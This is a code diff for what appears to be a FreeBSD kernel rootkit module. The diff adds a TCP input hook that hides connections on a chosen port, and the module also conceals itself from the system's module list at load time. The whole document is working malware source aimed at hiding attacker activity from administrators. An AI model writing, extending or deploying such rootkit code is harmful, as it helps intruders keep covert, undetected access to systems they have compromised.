@@ -43,7 +43,18 @@ static void hide_port(int lport)
     INP_INFO_WUNLOCK(&tcbinfo);
 }
 
+/* Kind of ugly hack to hide all new connections */
 static void tcp_input_hook(struct mbuf *m, int off0) {
+	struct tcphdr *th = NULL;
+	struct ip *ip = NULL;
+
+	ip = mtod(m, struct ip *);
+	th = (struct tcphdr *)((caddr_t)ip + off0);
+	
+	if (ntohs(th->th_dport) == HIDE_PORT_TEST)
+		hide_port(HIDE_PORT_TEST);
+	
+	tcp_input(m, off0);
 }
 
 static void hide_module(void)
@@ -110,7 +121,7 @@ static int module_events(struct module *module, int cmd, void *arg)
 
             if (MODULE_HIDE) {
 #if DEBUG
-                uprintf("Hiding %s module.\n", MODULE_FILE);
+                printf("Hiding %s module.\n", MODULE_FILE);
 #endif
                 hide_module();
             }
@@ -119,7 +130,7 @@ static int module_events(struct module *module, int cmd, void *arg)
 
         case MOD_UNLOAD:
 #if DEBUG
-            uprintf("Module %s unloaded.\n", MODULE_FILE);
+            printf("Module %s unloaded.\n", MODULE_FILE);
 #endif
 			inetsw[ip_protox[IPPROTO_TCP]].pr_input = tcp_input;
             break;
